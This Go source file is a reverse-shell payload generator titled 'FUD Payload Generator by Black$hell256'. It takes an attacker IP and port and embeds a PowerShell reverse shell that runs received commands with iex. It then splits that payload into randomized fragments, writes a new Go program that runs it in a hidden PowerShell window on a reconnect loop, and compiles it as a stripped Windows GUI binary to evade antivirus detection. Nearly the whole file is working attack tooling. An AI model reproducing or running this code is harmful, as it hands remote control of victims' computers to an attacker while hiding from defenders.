package main

import (
	"fmt"
	"io/ioutil"
	Rand "math/Rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/fatih/color"
)

var name string
var dir string

const letterBytes = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
const (
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

func main() {

	Map_Leng := Language()
	Generate(Map_Leng)
}

func Language() map[uint8]string {

	Lang := os.Getenv("LANG")
	Lang_Prefix := strings.HasPrefix(Lang, "es_ES")
	var l map[uint8]string

	switch Lang_Prefix {
	case true:
		l = map[uint8]string{
			1: "Generador de Payloads FUD by Black$hell256",
			2: "Ingresa ip: ",
			3: "Ip invalida",
			4: "Ingresa puerto: ",
			5: "Puerto invalido",
			6: "Ingresa nombre del archivo: ",
			7: "Ingresa tiempo de reconexion: ",
			8: "Tiempo invalido",
			9: "\nCompilando archivo go..",
		}

	default:
		l = map[uint8]string{
			1: "FUD Payload Generator by Black$hell256",
			2: "Enter ip: ",
			3: "Invalid Ip",
			4: "Enter port: ",
			5: "Port invalid",
			6: "Enter file name: ",
			7: "Enter reconnection time: ",
			8: "Invalid time",
			9: "\nCompiling file go.",
		}

	}
	return l

}

func Generate(l map[uint8]string) {

	Execute("clear")
	ex, err := os.Executable()
	if err != nil {
		panic(err)
	}

	exPath := filepath.Dir(ex)
	Env := os.Getenv("TEMP")
	end := strings.HasPrefix(ex, Env)

	if end {
		temp, err := os.Getwd()
		if err != nil {
			panic(err)
		}
		dir = temp
	} else {
		dir = exPath
	}

	var Ip string
	var Port string
	var Session string

	color.Blue(l[1] + "\n\n")

	red := color.New(color.FgRed).PrintfFunc()

	for {
		red(l[2])
		_, err := fmt.Scan(&Ip)
		if err != nil {
			panic(err)
		}

		Check_Ip := strings.ContainsAny(Ip, ".")
		if Check_Ip {
			break
		} else {
			cls(l[3], l)

		}
	}

	var Port_temp int
	for {
		red(l[4])
		_, err := fmt.Scan(&Port_temp)
		if err != nil {
			panic(err)
		}

		if 0 < Port_temp && Port_temp <= 65535 {
			Port = strconv.Itoa(Port_temp)
			break

		}
		cls(l[5], l)

	}

	red(l[6])
	_, err2 := fmt.Scan(&name)
	if err2 != nil {
		panic(err)
	}

	var Temp_session int

	for {
		red(l[7])
		_, err := fmt.Scan(&Temp_session)
		if err != nil {
			panic(err)
		}

		if Temp_session > 0 {
			Session = strconv.Itoa(Temp_session)
			break

		}
		cls(l[8], l)

	}

	Payload := `$x = 'UwBvAGM'; $xd = 'AawBlA'; $client = New-Object System.Net.$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(('{0}{1}HQAcwA=' -f $x, $xd)))).TCPClient("` + Ip + `" ,` + Port + `);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = ('{0}PS ' -f $sb) + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes(('{0}') -f $sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};('{0}.Close()' -f $client)`
	Random := RandStringBytesMaskImprSrcUnsafe(10)

	var Slice []string
	for _, Rune := range Random {

		Sprinft := fmt.Sprintf("(?:(?:%s))", string(Rune))
		Slice = append(Slice, Sprinft)

	}

	Join := strings.Join(Slice, "|")
	Regex := regexp.MustCompile(Join)
	Split := Split(Regex, Payload, -1)

	var Slice2 []string

	code := RandStringBytesMaskImprSrcUnsafe(36)
	for _, letters := range Split {

		Sprinft2 := fmt.Sprintln("\t" + code + " += `" + letters + "`")
		Slice2 = append(Slice2, Sprinft2)
	}

	Delimiters := strings.Join(Slice2, "")
	cmd := RandStringBytesMaskImprSrcUnsafe(40)
	exec := RandStringBytesMaskImprSrcUnsafe(39)
	time := RandStringBytesMaskImprSrcUnsafe(38)
	syscall := RandStringBytesMaskImprSrcUnsafe(37)

	data := []byte("package main\n\nimport (\n\t" + exec + `  "os/exec"` +
		"\n\t" + syscall + `  "syscall"` + "\n\t" + time + `  "time"` + "\n)\n\n" +
		"func main() {\n\n\t" + code + ` := ""` + "\n" + Delimiters +
		"\n\tfor {\n\t\t" + cmd + ` := ` + exec + `.Command("powershell", "-c", ` + code + `)` + "\n\t\t" +
		cmd + `.SysProcAttr = &` + syscall + `.SysProcAttr{HideWindow: true}` + "\n\t\t" + cmd + ".Run()" +
		"\n\t\t" + time + ".Sleep(" + Session + "* " + time + ".Second)\n\t" + "}\n" + "}")

	err3 := ioutil.WriteFile(name+".go", data, 0644)
	if err3 != nil {
		panic(err3)
	}

	color.Blue(l[9])
	Execute("comp")

}

func cls(msg string, l map[uint8]string) {
	color.Red("\n\n[!] Error : " + msg)
	time.Sleep(2 * time.Second)
	Execute("clear")
	color.Blue(l[1] + "\n\n")
}

func Execute(command string) {
	var output []byte
	var cmd *exec.Cmd

	switch runtime.GOOS {
	case "windows":
		if command == "comp" {
			file := dir + "\\" + name + ".go"
			command = `go build -ldflags "-H windowsgui -s -w" ` + file
		}
		cmd = exec.Command("powershell", "-c", command)
	default:
		if command == "comp" {
			file := dir + "/" + name + ".go"
			command = string(`GOOS=windows GOARCH=amd64 go build -ldflags "-H windowsgui -s -w" ` + file)
		}
		cmd = exec.Command("sh", "-c", command)
	}

	var err error
	output, err = cmd.Output()
	if err != nil {
		panic(err)
	}
	fmt.Println(string(output))
}

func Split(re *regexp.Regexp, s string, n int) []string {
	if n == 0 {
		return nil
	}

	matches := re.FindAllStringIndex(s, n)
	strings := make([]string, 0, len(matches))

	beg := 0
	end := 0
	for _, match := range matches {
		if n > 0 && len(strings) >= n-1 {
			break
		}

		end = match[0]
		if match[1] != 0 {
			strings = append(strings, s[beg:end])
		}
		beg = match[1]
		strings = append(strings, s[match[0]:match[1]])
	}

	if end != len(s) {
		strings = append(strings, s[beg:])
	}

	return strings
}

func RandStringBytesMaskImprSrcUnsafe(n int) string {
	var src = Rand.NewSource(time.Now().UnixNano())
	b := make([]byte, n)
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			b[i] = letterBytes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return *(*string)(unsafe.Pointer(&b))
}
